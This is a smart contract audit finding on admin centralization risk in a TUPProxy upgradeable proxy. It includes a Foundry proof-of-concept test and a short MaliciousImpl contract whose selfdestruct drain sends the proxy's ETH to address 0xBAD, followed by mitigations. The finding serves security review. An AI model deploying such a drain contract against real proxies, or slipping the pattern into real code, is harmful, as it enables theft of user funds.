# Finding: TUPProxy Admin Centralization Risk — Malicious Upgrade Drains ETH

## Severity

**High** — Admin can upgrade to arbitrary implementation and drain all ETH from any proxy

## Description

The [`TUPProxy`](src/contracts/TUPProxy.sol) inherits the transparent proxy pattern from OpenZeppelin's [`TransparentUpgradeableProxy`](@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol), which grants the admin address unchecked power to:

1. **Upgrade the implementation** via [`upgradeTo(address)`](@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol:107) — The admin can point the proxy to any contract.
2. **Upgrade and execute arbitrary code** via [`upgradeToAndCall(address,bytes)`](@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol:113) — The admin can deploy a malicious implementation and execute arbitrary initialization code in the same transaction, bypassing any implementation-level access controls.

The pause mechanism in [`TUPProxy._beforeFallback()`](src/contracts/TUPProxy.sol:41) only blocks _non-admin_ calls when paused — admin proxy functions (`upgradeTo`, `changeAdmin`, `admin`, `implementation`) are unaffected.

```solidity
// TUPProxy.sol, lines 41-47
function _beforeFallback() internal override {
    if (StorageSlot.getBooleanSlot(_PAUSE_SLOT).value == false || msg.sender == address(0)) {
        super._beforeFallback();
    } else {
        revert CallWhenPaused();
    }
}
```

## Impact

An admin with a compromised private key, or a malicious admin, can:

1. Drain all ETH from every proxy contract to an arbitrary address
2. Replace any proxy's implementation with arbitrary logic
3. Steal user funds, redirect fee rewards, or permanently brick contracts

## Proof of Concept

The [`test_admin_can_upgrade_to_malicious`](test/ProxyAudit.t.sol:362) Foundry test demonstrates this vulnerability:

```solidity
function test_admin_can_upgrade_to_malicious() public {
    // Give the proxy some ETH
    vm.deal(address(proxy), 100 ether);

    // Admin upgrades to malicious implementation via upgradeToAndCall
    vm.startPrank(admin);
    proxy.upgradeToAndCall(
        address(maliciousImpl),
        abi.encodeWithSelector(MaliciousImpl.drain.selector)
    );
    vm.stopPrank();

    // Proxy is drained
    assertEq(address(proxy).balance, 0, "Proxy should be drained");
    assertEq(address(maliciousImpl.STEAL_ADDR()).balance, 100 ether, "ETH stolen");
}
```

The `MaliciousImpl` contract:

```solidity
contract MaliciousImpl {
    address public constant STEAL_ADDR = address(0xBAD);

    function drain() external payable {
        selfdestruct(payable(STEAL_ADDR));
    }
}
```

When `drain()` is called through the proxy via `upgradeToAndCall`, `selfdestruct` forwards all proxy ETH to the attacker's address.

### Test Output

```
[PASS] test_admin_can_upgrade_to_malicious() (gas: 61423)
Logs:
  Proxy ETH before drain: 100000000000000000000
  Proxy ETH after admin upgrade+drain: 0
  ETH sent to malicious address: 100000000000000000000
```

## Recommended Mitigation

1. **Multi-sig admin**: Use a multi-signature wallet or DAO as the proxy admin, never an EOA.
2. **Timelock**: Add a timelock delay on `upgradeTo` and `upgradeToAndCall` to allow users to exit before upgrades take effect.
3. **Admin freeze**: Consider a two-step process where the admin can be renounced after setup is complete.
4. **Proxy freeze**: After all proxies are initialized, consider transferring admin to `address(0)` to permanently lock upgradeability.

## Status

Open — Acknowledged centralization risk (see also [F-006](F-006-centralization-risks.md))
